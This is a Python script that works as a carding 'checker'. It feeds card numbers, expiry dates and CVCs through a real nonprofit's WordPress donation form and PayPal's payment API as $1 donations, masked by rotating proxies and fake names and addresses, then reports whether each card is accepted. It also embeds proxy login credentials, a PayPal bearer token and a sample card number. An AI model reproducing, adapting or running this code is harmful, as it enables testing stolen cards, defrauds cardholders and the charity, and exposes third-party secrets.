import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    #elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        #mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)
    d1 = random.randint(1, 4)
    d2 = random.randint(1, 99)
    
    headers = {
        'authority': 'connecticutancestry.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get('https://connecticutancestry.org/donate/', headers=headers)
    
    id = re.search(r'name="wpforms\[id\]" value="(.*?)"', response.text).group(1)
    page = re.search(r'name="page_id" value="(.*?)"', response.text).group(1)
    post = re.search(r'name="wpforms\[post_id\]" value="(.*?)"', response.text).group(1)
    nonce = re.search(r'"create":"(.*?)"', response.text).group(1)
    tok = re.search(r'data-formid="1163" method="post" enctype="multipart/form-data" action="/donate/" data-token="(.*?)"', response.text).group(1)
    #print(tok)
    
    cookies = {
        '_wpfuuid': '1bd72860-c261-4e34-88db-fd6bbc3bf568',
    }
    
    headers = {
        'authority': 'connecticutancestry.org',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary1QO7l7j61rjDlWv9',
        # 'cookie': '_wpfuuid=1bd72860-c261-4e34-88db-fd6bbc3bf568',
        'origin': 'https://connecticutancestry.org',
        'referer': 'https://connecticutancestry.org/donate/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }
    
    params = {
        'action': 'wpforms_paypal_commerce_create_order',
    }
    
    files = {
        'wpforms[fields][1]': (None, f'{first_name} {last_name}'),
        'wpforms[fields][7]': (None, ''),
        'wpforms[fields][6]': (None, ''),
        'wpforms[fields][2]': (None, f'yellhtetgaung{nr}@gmail.com'),
        'wpforms[fields][3]': (None, '1.00'),
        'wpforms[fields][4]': (None, 'Donation'),
        'wpforms[fields][5][orderID]': (None, ''),
        'wpforms[fields][5][subscriptionID]': (None, ''),
        'wpforms[fields][5][subscriptionProcessorID]': (None, ''),
        'wpforms[fields][5][source]': (None, ''),
        'wpforms[fields][5][fastlane_token]': (None, ''),
        'wpforms[fields][5][cardname]': (None, 'Yell Htet'),
        'wpforms[id]': (None, f'{id}'),
        'page_title': (None, 'Donate'),
        'page_url': (None, 'https://connecticutancestry.org/donate/'),
        'url_referer': (None, 'https://www.google.com/'),
        'page_id': (None, f'{page}'),
        'wpforms[post_id]': (None, f'{post}'),
        'total': (None, '1'),
        'nonce': (None, f'{nonce}'),
        'payment_source': (None, 'card'),
    }
    
    response = session.post(
        'https://connecticutancestry.org/wp-admin/admin-ajax.php',
        params=params,
        #cookies=cookies,
        headers=headers,
        files=files,
    )
    
    order = re.search(r'"id":"(.*?)"', response.text).group(1)
    #print(order)
    
    headers = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer A21AAOPVcctnKVFya5XrNwJ2aHrzgQxd6dVcMEwGiaVwJsuVEXt6C2opYztwb76-i1OdTuy-lelAztrd79_IqHpSizUkQ6l0Q',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'paypal-client-metadata-id': '3e71b2ceccb9ce52c86355bf9f525071',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    
    json_data = {
        'payment_source': {
            'card': {
                'number': f'{n}',
                'expiry': f'20{yy}-{mm}',
                'security_code': f'{cvc}',
                'name': f'{first_name} {last_name}',
                'attributes': {
                    'verification': {
                        'method': 'SCA_WHEN_REQUIRED',
                    },
                },
            },
        },
        'application_context': {
            'vault': False,
        },
    }
    
    response = requests.post(
        f'https://cors.api.paypal.com/v2/checkout/orders/{order}/confirm-payment-source',
        headers=headers,
        json=json_data,
    )
    
    try:
        token = re.search(r'"id":"(.*?)"', response.text).group(1)
    except:
        token = re.search(r'"issue":"(.*?)"', response.text).group(1)
    #print(token)
    
    cookies = {
        '_wpfuuid': '1bd72860-c261-4e34-88db-fd6bbc3bf568',
    }
    
    headers = {
        'authority': 'connecticutancestry.org',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary9Gu9IkA66qkgDADF',
        # 'cookie': '_wpfuuid=1bd72860-c261-4e34-88db-fd6bbc3bf568',
        'origin': 'https://connecticutancestry.org',
        'referer': 'https://connecticutancestry.org/donate/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    files = {
        'wpforms[fields][1]': (None, f'{first_name} {last_name}'),
        'wpforms[fields][7]': (None, ''),
        'wpforms[fields][6]': (None, ''),
        'wpforms[fields][2]': (None, f'yellhtetgaung{nr}@gmail.com'),
        'wpforms[fields][3]': (None, '1.00'),
        'wpforms[fields][4]': (None, 'Donation'),
        'wpforms[fields][5][orderID]': (None, f'{token}'),
        'wpforms[fields][5][subscriptionID]': (None, ''),
        'wpforms[fields][5][subscriptionProcessorID]': (None, ''),
        'wpforms[fields][5][source]': (None, ''),
        'wpforms[fields][5][fastlane_token]': (None, ''),
        'wpforms[fields][5][cardname]': (None, 'Yell Htet'),
        'wpforms[id]': (None, f'{id}'),
        'page_title': (None, 'Donate'),
        'page_url': (None, 'https://connecticutancestry.org/donate/'),
        'url_referer': (None, 'https://www.google.com/'),
        'page_id': (None, f'{page}'),
        'wpforms[post_id]': (None, f'{post}'),
        'wpforms[token]': (None, f'{tok}'),
        'action': (None, 'wpforms_submit'),
        'start_timestamp': (None, '1777744284'),
        'end_timestamp': (None, '1777744342'),
    }
    
    response = session.post('https://connecticutancestry.org/wp-admin/admin-ajax.php', #cookies=cookies, 
    headers=headers, files=files)
    
    match1 = re.search(r'Form error message<\\/span><p>(.*?)<\\/p>', response.text)
    if match1:
        result = match1.group(1)
    elif match2 := re.search(r'id=\\"wpforms-confirmation-1163\\"><p>(.*?)<\\/p>', response.text):
        result = match2.group(1)
    else:
        result = token

    return result
    
#test_card = "5132848403801477|04|2026|399"
#print(Tele(test_card))
